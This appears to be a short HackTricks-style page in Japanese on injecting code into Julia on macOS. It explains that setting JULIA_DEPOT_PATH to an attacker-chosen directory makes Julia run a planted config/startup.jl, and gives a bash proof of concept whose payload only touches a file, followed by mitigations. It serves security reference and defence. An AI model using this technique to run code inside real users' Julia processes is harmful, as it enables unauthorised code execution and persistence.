# macOS Juliaアプリケーションインジェクション

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` と `startup.jl`

Juliaは通常、起動時に最初のデポにある`config/startup.jl`を実行します。`JULIA_DEPOT_PATH`はデポのリストを制御するため、攻撃者が読み取り可能なツリーを指定すると、自動的に読み込まれるstartupファイルを別のものに向けられます。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```
末尾の区切り文字は、被害者が通常のパッケージを引き続き必要とする場合に役立ちます。`julia --startup-file=no` はこの startup file を無効にします。起動前に変数をクリアしてください。これは package registries、environments、caches、code-loading locations も制御するためです。

## References

- [1] [Julia command-line interface: Startup file](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Julia environment variables: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
{{#include ../../../banners/hacktricks-training.md}}
